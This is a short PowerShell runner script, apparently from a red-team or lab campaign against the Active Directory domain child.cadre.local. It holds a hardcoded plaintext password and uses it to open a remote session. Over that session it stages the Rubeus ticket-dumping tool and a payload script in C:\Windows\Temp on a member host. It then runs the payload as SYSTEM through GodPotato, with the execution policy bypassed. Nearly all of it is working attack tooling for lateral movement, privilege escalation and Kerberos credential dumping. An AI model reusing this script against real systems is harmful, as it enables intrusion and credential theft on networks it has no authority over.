# Runner: stage official Rubeus + run 3.5K v6 (Rubeus dump)
$ErrorActionPreference = 'Stop'
$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', (ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force))
$session = New-PSSession -ComputerName 'mbr01.child.cadre.local' -Credential $cred
Copy-Item -Path 'C:\Tools\ADTools\Rubeus-try4.exe' -Destination 'C:\Windows\Temp\cadre-tools\Rubeus-official.exe' -ToSession $session -Force
Copy-Item -Path "$PSScriptRoot\wt035k-v6-payload.ps1" -Destination 'C:\Windows\Temp\cadre-tools\wt035k-v6-payload.ps1' -ToSession $session -Force
Remove-PSSession $session
Write-Output 'STAGED_RUBEUS_OFFICIAL'
& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server 192.168.77.22 -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock "powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\cadre-tools\wt035k-v6-payload.ps1"
Write-Output '3.5K_V6_RUN_DONE'
